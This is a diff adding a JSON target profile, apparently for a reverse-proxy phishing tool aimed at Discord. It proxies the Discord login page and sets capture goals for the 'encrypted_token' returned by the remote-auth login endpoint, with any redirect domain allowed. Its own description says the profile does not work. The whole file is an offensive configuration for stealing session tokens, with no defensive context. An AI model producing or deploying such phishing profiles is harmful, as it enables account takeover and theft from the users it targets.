@@ -1,0 +1,36 @@
+{
+    "auth_goals": {
+        "goal_urls": ["https://discord.com/api/v9/users/@me/remote-auth/login"],
+        "return_body_requires_type": "json",
+        "return_body_requires_json_schema": {
+            "type": "object",
+            "properties": {
+                "encrypted_token": {
+                    "type": "string"
+                }
+            }
+        },
+        "return_body_requires_regex": null,
+        "required_cookies": [],
+        "required_cookies_regex": {},
+        "required_headers": [],
+        "required_headers_regex": {},
+        "required_query_params": [],
+        "required_query_params_regex": {},
+        "status_codes": []
+    },
+    "proxy_configuration": {
+        "target": "https://discord.com/login",
+        "filtering": {
+            "html": true,
+            "css": true,
+            "js": false
+        },
+        "proxy_cdns": true,
+        "request_proxies": {}
+    },
+    "description": "Discord Login - DOES NOT WORK",
+    "name": "Discord",
+    "redirect_uri_domains": ["*"],
+    "redirect_code": true
+}
